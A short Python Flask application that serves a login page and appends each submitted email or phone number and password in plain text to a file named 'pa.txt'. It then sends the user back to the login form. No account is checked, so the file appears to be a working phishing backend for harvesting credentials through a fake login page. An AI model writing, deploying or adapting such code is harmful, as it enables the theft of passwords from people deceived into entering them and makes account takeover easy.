import os
from flask import Flask, request, render_template, redirect, url_for

# Initialize Flask app
app = Flask(__name__)

# Define the file to store credentials
CREDENTIALS_FILE = "pa.txt"

@app.route('/')
def index():
    """Serves the login page."""
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Handles the login form submission."""
    email = request.form.get('email')
    password = request.form.get('pass')

    if email and password:
        try:
            # Ensure the directory exists (optional, useful if CREDENTIALS_FILE includes a path)
            # os.makedirs(os.path.dirname(CREDENTIALS_FILE), exist_ok=True)

            # Append credentials to the file
            with open(CREDENTIALS_FILE, 'a', encoding='utf-8') as f:
                f.write(f"Email/Phone: {email}, Password: {password}\n")

            # Optionally, redirect to a 'success' page or back to the form
            # For simplicity, just return a message or redirect
            # return "Login information saved."
            # Or redirect back to the form (or another page)
            return redirect(url_for('index')) # Redirect back to login page

        except IOError as e:
            print(f"Error writing to file {CREDENTIALS_FILE}: {e}")
            # Handle error appropriately, maybe return an error message
            return "Error saving login information.", 500
    else:
        # Handle cases where email or password might be missing
        return "Missing email or password.", 400

if __name__ == '__main__':
    # Run the app in debug mode for development
    # Debug mode provides auto-reloading and more detailed error messages
    # Make sure to turn off debug mode in production
    app.run(debug=False, host='0.0.0.0')
